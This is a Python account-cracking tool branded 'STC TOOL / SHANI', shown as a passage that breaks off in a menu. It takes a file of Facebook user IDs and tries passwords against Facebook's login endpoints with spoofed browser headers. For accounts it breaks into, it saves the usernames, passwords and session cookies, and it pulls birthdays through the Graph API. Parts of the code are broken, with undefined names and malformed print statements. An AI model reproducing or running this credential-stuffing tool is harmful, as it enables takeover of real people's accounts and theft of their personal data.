
import os
try:
    import requests
except ImportError:
    print('\n [×] Modul requests belum terinstall!...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [×] Modul Futures belum terinstall!...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [×] Modul Bs4 belum terinstall!...\n')
    os.system('pip install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime, subprocess
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from bs4 import BeautifulSoup
agent = [
"BET_61D_WIFI_11C_HW (O) C67_SmartOpus_SL008_20191225_V802 Release/2019.12.25 WAP Browser/MAUI Profile/ Q03C1-2.40 en-US","Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5","Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 ;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5""Mozilla/5.0 (Linux; Android 10; M2010J19SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
"Mozilla/5.0 (Linux; Android 10; M2010J19SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
"HXJ5001_11B (MRE\x5C2.5.00(3072) resolution\x5C272480 chipset\x5CMT6250 touch\x5C1 tpannel\x5C1 camera\x5C1 gsensor\x5C0 keyboard\x5Creduced) ZHJ5001_ML12 Release/2013.03.04 WAP Browser/MAUI (HTTPS) Profile/ Q03C1-2.40 ru-RU Google",
]
rua = random.choice(agent)
ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
waktu = '%s %s %s'%(ha,op,ta)
waktu.split('/')
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
############################ RESPONSE FACEBOOK ###########################################
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,pwBaru=[],[]
Apk = []
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url1 = "https://mbasic.facebook.com/"
url2 = "mbasic.facebook.com"

    
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
     
def mentod():
    print('%s══════════════════════════════════════════\n %sMETHOD MENU%s'%(N,BM,N))
    print(' %s[%s1%s] Method 1 (%sRecommended%s)'%(N,H,N,H,N))
    print(' [%s2%s] Method 2 (%sRecommended%s)'%(H,N,H,N))
    print(' [%s3%s] Method 3 (%sRecommended%s)'%(H,N,H,N))
#-------- LOADING ANIMASI ------------
def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r {N}[{H}•{N}] {H}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")
# LOGO
logo =                                          """   
\033[0;41m   💫 SOMETIMES A KING HAS TO REMIND FOOLS WHY HE IS KING 💫   \033[0;97m 


  \033[1;31m..######..##.....##....###....##....##.####
  \033[1;30m.##....##.##.....##...##.##...###...##..##.
  \033[1;32m.##.......##.....##..##...##..####..##..##.
  \033[1;33m..######..#########.##.....##.##.##.##..##.
  \033[1;37m.......##.##.....##.#########.##..####..##.
  \033[1;32m.##....##.##.....##.##.....##.##...###..##.
  \033[1;30m..######..##.....##.##.....##.##....##.####


\x1b[1;97m---------------------SHONA-\x1b[1;97m-----------------------
 \033[1;31m\033[1;31m 💫 Author \x1b[1;97m          : \033[1;33m      💫 SHANI
 \033[1;31m\033[1;30m 💫 Facebook\x1b[1;97m         :  \033[1;36m     💫 SHANI
 \033[1;31m\033[1;33m 💫 GitHub\x1b[1;97m           : \033[1;38m      💫 STC75
 \033[1;31m\033[1;32m 💫 Version\x1b[1;97m          : \033[1;31m      💫 2.0
 \033[1;31m\033[1;36m 💫 TEAM   \x1b[1;97m          : \033[1;32m      💫 𝕊 𝕋 ℂ
 \033[1;31m\033[1;38m 💫 TOOL   \x1b[1;97m          : \033[1;34m      💫 FILE CLONING
\033[1;37m---------------------SHANI\033[1;37m------------------------

\033[0;42m             💫WELCOME TO STC TOOL💫              \033[0;97m """
#CRACK SELESAI
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCracking By Shona Usercrack...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
        print(f' %s[%s+%s] Number of Accounts OK : %s%s%s'%(H,H,H,H,str(len(ok)),H))
        print(f' [%s+%s] Number of Accounts CP : %s%s%s'%(H,H,H,str(len(cp)),H))
        cek_cp = input(f"{H}══════════════════════════════════════════\n [{H}+{H}] Show CP detector options [{H}Y{N}/{M}t{N}]: ")
        if cek_cp =="":
            print(f"\n [{M}!{N}] Don't be empty");hasil(ok,cp)
        elif cek_cp in["Y","y"]:
            jalan(f" {N}[{M}!{N}] Play airplanemode first");time.sleep(5)
            ww=input(f"\n {N}[{K}?{N}] Change password when {BM}TAP YES{N} [{H}Y{N}/{M}t{N}]: ")
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" {N}[{H}•{N}] Password example : {H}shona123{N}")
                pwBar=input(f" {N}[{K}?{N}] Enter new password : {H}")
                #print("\n")
                if len(pwBar) <= 5:
                    print('\n %s[%s×%s] Password minimum 6 characters'%(N,M,N))
                else:
                    pwBaru.append(pwBar)
            for memek in cp:
                kontol = memek.replace('\n', '')
                titid  = kontol.split(' • ')
                print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[SHONA-CP] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[SHONA--CP] ", ""), titid[1])
                except requests.exceptions.ConnectionError:
                    continue
                    print("")
            print("")
            jalan(' %s[%s✓%s] %sChecking process is complete%s'%(N,H,N,H,N))
            jalan(' %s[%s✓%s] Retrun SC type "%spython UserCrack.py%s"'%(N,H,N,H,N));exit()
        elif cek_cp in["T","t"]:
            jalan(f"\n {N}[{H}•{N}] {N}Ok, thank you. Retrun SC type '{H}python UserCrack.py{N}'");exit()
        else:
            print(f"\n {N}[{M}!{N}] Choose Y/t");hasil(ok,cp)
    else:
        jalan('\n\n %s[%s!%s] Sorry you didnt get results'%(N,M,N));exit()



def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r 🎮  %sYour Active Application Details :'%(H))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r 🎮  %sYour Expired Application Details :'%(M))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(f'\r')
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie\n'%(N,M,N))
#METODE LOGIN
### MENU UTAMA ###
os.system ("clear")
def file():
	        
            print(logo)
            
            print("\033[1;97m [01] File Clone ")
            print(" [00] Exit")
            
            
            key = input("\n [+] Input : ")
            if key in [""]:
                print(" [!] please select correct option")
                exit()
            elif key in ["1", "01"]:
                __chigoue__().chi(id)

# MULAI CRACK
class __chigoue__:
    def __init__(self):
        self.id = []
    def chi(self, id):
        os.system("clear")
        print(logo)
        crot = input(f" {H}[{H}+{H}] Want to show related apps [{H}y{H}/{H}t{H}]: ")
        if crot in[""]:
            print(f" {N}[{M}×{N}] Don't be empty");__chigoue__().chi(id)
        elif crot in["Y","y"]:
            Apk.append("y")
        elif crot in["T","t"]:
            Apk.append("t")
        else:
            #jalan(f" {N}[{M}×{N}] Sorry, wrong username");self.tampilkan_apk()
            print(f" {H}[{H}×{H}] Select Between y/t");__chigoue__().chi(id)
        self.cnt = input('\033[1;92m [+] Enter File Name :\033[1;92m ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        ___two___ = ('y')
        if ___two___ in ('yes', 'Yes', 'Y', 'y'):
#            self.__ok__()
            self.__pler__()
        else:
            print(' [!] Choose Correct One')
            self.chi(id)

# METODE SANDI MANUAL
            #print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.plerr(id)
# PROSES CRACK METODE 3 in 1
    def __metode__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;92m[SHANI]","\x1b[1;92m[S T C]","\x1b[1;92m[SHANI]","\x1b[1;92m[S T C]","\x1b[1;92m[SHANI]","\x1b[1;92m[S T C]","\x1b[1;92m[SHANI🤫]"])
        sys.stdout.write(f"\r {N}{animasi} {N}{loop}{N}/{M}{len(self.id)} {N}[{H}OK:{len(ok)}{N}] [{H}{'{:.1%}'.format(loop/float(len(self.id)))}{N}]")
        sys.stdout.flush()
        try:
            for pw in pasw:
                pw = pw.lower()
                session=requests.Session()
                dat = {}
                url = session.get(f"https://free.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin")
                das = {
                "Host":"free.facebook.com",
                "connection":"keep-alive",
                "cache-control": "max-age=0",
                "save-data": "on",
                "origin": "https://free.facebook.com",
                "content-type": "application/x-www-form-urlencoded",
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Pragma":"akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace",
                "x-requested-with": "mark.via.gp",
                "dnt": "1",
                "sec-ch-ua":"' Not A;Brand';v='99', 'Chromium';v='99'",
                "sec-ch-ua-platform":"'Android'",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-user": "?1",
                "sec-fetch-dest": "document",
                "Upgrade-Insecure-Requests":"1",
                "User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
                 "referer": "https://free.facebook.com/login/device-based/password/?uid="+user+"&flow=login_no_pin",
                "accept-encoding": "gzip, deflate",
                "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"
                }
                dat = {"lsd": re.search('name="lsd" value="(.*?)"', str(url.text)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"uid": user,"flow":"login_no_pin","pass": pw,"flow": "login_no_pin","next": "https://m.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr"}
                xx = session.post("https://free.facebook.com/login/device-based/validate-password/?shbl=0", data=dat, headers=das)
                
                
                if "c_user" in session.cookies.get_dict():
                    cooz = session.cookies.get_dict()
                    coki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
                    if "t" in Apk:
                        print('\r %s[ OK ] %s • %s              %s'%(H, user, pw, N))
                    elif "y" in Apk:
                        print('\r %s[ OK ] %s • %s              %s'%(H, user, pw, N))
                    wrt = '[SHANI🥰-OK] %s • %s' % (user,pw)
                    ok.append(wrt)
                    cek_apk(session,coki)
                    open('/sdcard/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r '%(H, user, pw, N))
                        wrt = '[-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
                        open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:pass
                    print('\%s'%(H, user, pw, N))
                    wrt = '[SHANI😓-CP] %s • %s' % (user,pw)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
                #time.sleep(31)
            loop+=1
        except requests.exceptions.ConnectionError:
             self.__metode9__(cebok, user, pasw)

    def __metode1__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;92m[SHANI","\x1b[1;92m[S T C]","\x1b[1;92m[SHANI]","\x1b[1;92m[S T C]","\x1b[1;92m[SHANI]","\x1b[1;92m[S T C]","\x1b[1;92m[SHANI🤫]"])
        sys.stdout.write(f"\r{N}{animasi} {N}{loop}{N}|{N}{len(self.id)} {N}[{H}OK:0{N}][{K}CP:{len(cp)}{N}] [{H}{'{:.1%}'.format(loop/float(len(self.id)))}{N}]")
        sys.stdout.flush()
        try:
            for pw in pasw:
                pw = pw.lower()
                session=requests.Session()
                dat = {}
                url = session.get(f"https://free.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin")
                das = {
                "Host":"free.facebook.com",
                "connection":"keep-alive",
                "cache-control": "max-age=0",
                "save-data": "on",
                "origin": "https://free.facebook.com",
                "content-type": "application/x-www-form-urlencoded",
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Pragma":"akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace",
                "x-requested-with": "mark.via.gp",
                "dnt": "1",
                "sec-ch-ua":"' Not A;Brand';v='99', 'Chromium';v='99'",
                "sec-ch-ua-platform":"'Android'",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-user": "?1",
                "sec-fetch-dest": "document",
                "Upgrade-Insecure-Requests":"1",
                "User-Agent":"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.0.1.56",
                "User-Agent":"Nokia5310XpressMusic/2.0 (10.10) Profile/MIDP-2.1 Configuration/CLDC-1.1",
                 "referer": "https://free.facebook.com/login/device-based/password/?uid="+user+"&flow=login_no_pin",
                "accept-encoding": "gzip, deflate",
                "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"
                }
                dat = {"lsd": re.search('name="lsd" value="(.*?)"', str(url.text)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"uid": user,"flow":"login_no_pin","pass": pw,"flow": "login_no_pin","next": "https://m.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr"}
                xx = session.post("https://free.facebook.com/login/device-based/validate-password/?shbl=0", data=dat, headers=das)
                
                
                if "c_user" in session.cookies.get_dict():
                    cooz = session.cookies.get_dict()
                    coki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
                    if "t" in Apk:
                        print('\r %s[ OK ] %s • %s              %s'%(H, user, pw, N))
                    elif "y" in Apk:
                        print('\r %s[ OK ] %s • %s              %s'%(H, user, pw, N))
                    wrt = '[SHANI🥰-OK] %s • %s' % (user,pw)
                    ok.append(wrt)
                    cek_apk(session,coki)
                    open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r %sCP %s               \n Username : %s\n Password : %s\n  %s %s %s%s\n'%(K,waktu,user,pw,day,month,year,N))
                        wrt = '[SHANI😓-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
                        open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:pass
                    print('\r %sCP %s               \n Username : %s\n Password : %s\n : %s %s %s%s\n'%(K,waktu,user,pw,day,month,year,N))
                    wrt = '[SHANI😓-CP] %s • %s' % (user,pw)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
                #time.sleep(31)
            loop+=1
        except requests.exceptions.ConnectionError:
             self.__metode1__(cebok, user, pasw)
             
             


    def __metode2__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;92m[SHANI]","\x1b[1;92m[S T C]","\x1b[1;92m[SHANI]","\x1b[1;92m[S T C]","\x1b[1;92m[SHANI]","\x1b[1;92m[S T C]","\x1b[1;92m[SHANI🤫]"])
        sys.stdout.write(f"\r{N}{animasi} {N}{loop}{N}|{N}{len(self.id)} {N}[{H}OK:0{N}][{K}CP:{len(cp)}{N}] [{H}{'{:.1%}'.format(loop/float(len(self.id)))}{N}]")
        sys.stdout.flush()
        try:
            for pw in pasw:
                pw = pw.lower()
                session=requests.Session()
                session=requests.Session()
                dat = {}
                url = session.get(f"https://free.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin")
                das = {
                "Host": "free.facebook.com",
                "connection":"keep-alive",
                "cache-control": "max-age=0",
                "save-data": "on",
                "origin": "https://free.facebook.com",
                "content-type": "application/x-www-form-urlencoded",
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Pragma":"akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace",
                "x-requested-with": "mark.via.gp",
                "dnt": "1",
                "sec-ch-ua":"' Not A;Brand';v='99', 'Chromium';v='99'",
                "sec-ch-ua-platform":"'Android'",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-user": "?1",
                "sec-fetch-dest": "document",
                "Upgrade-Insecure-Requests":"1",
                "User-Agent":"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.0.1.56",
                "referer": "https://free.facebook.com/login/device-based/password/?uid="+user+"&flow=login_no_pin",
                "accept-encoding": "gzip, deflate",
                "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"
                }
                dat = {"lsd": re.search('name="lsd" value="(.*?)"', str(url.text)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"uid": user,"flow":"login_no_pin","pass": pw,"flow": "login_no_pin","next": "https://m.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr"}
                xx = session.post("https://free.facebook.com/login/device-based/validate-password/?shbl=0", data=dat, headers=das)
                
                if "c_user" in session.cookies.get_dict():
                    cooz = session.cookies.get_dict()
                    coki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
                    if "t" in Apk:
                        print('\r %s[ OK ] %s • %s              %s'%(H, user, pw, N))
                    elif "y" in Apk:
                        print('\r %s[ OK ] %s • %s              %s'%(H, user, pw, N))
                    wrt = '[SHANI🥰-OK] %s • %s' % (user,pw)
                    ok.append(wrt)
                    cek_apk(session,coki)
                    open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r %sCP %s               \n Username : %s\n Password : %s\n Tanggal Lahir : %s %s %s%s\n'%(K,waktu,user,pw,day,month,year,N))
                        wrt = '[SHANI😓-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
                        open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:pass
                    print('\r %s[SHANI😓-CP] %s %s %s%s\n'%(K,user,pw,N))
                    wrt = '[SHANI😓-CP] %s • %s' % (user,pw)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
                #time.sleep(31)
            loop+=1
        except requests.exceptions.ConnectionError:
             self.__metode2__(cebok, user, pasw)
             
    def __pler__(self):
        os.system('clear')
        print(logo)
        print("---------------------------------------------")
        print ('\x1b[1;97m[1] Method\x1b[1;92m [WORKING]')
        print ('\x1b[1;97m[2] Method\x1b[1;92m [WORKING]')
        print ('\x1b[1;97m[3] Method ')
        print("---------------------------------------------")
        yan = input('\x1b[1;97m\n[+] Put Method : ')
        if yan == '':
            print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.__pler__()
        elif yan in ('1', '01'):
            xx = "free.facebook.com"
            os.system("clear")
            print(logo)
            self.kombinasi_pw(xx)
        elif yan in ('2', '02'):
            xx = "mbasic.facebook.com"
            os.system ("clear")
            print(logo)
            self.kombinasi_pw(xx)
        elif yan in ('3', '03'):
            xx = "m.facebook.com"
            os.system ("clear")
            print(logo)
            self.kombinasi_pw(xx)
        else:
            print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.__pler__()
            os.system ("clear")

    def kombinasi_pw(self,url):
    	
        print('----------------------------------------')
        print('\x1b[1;97m [1] AUTO PASS \x1b[1;92m[ MHTOD] [1] ')
        print('\x1b[1;97m [2] AUTO PASS \x1b[1;92m[ MHTOD] [2] ')
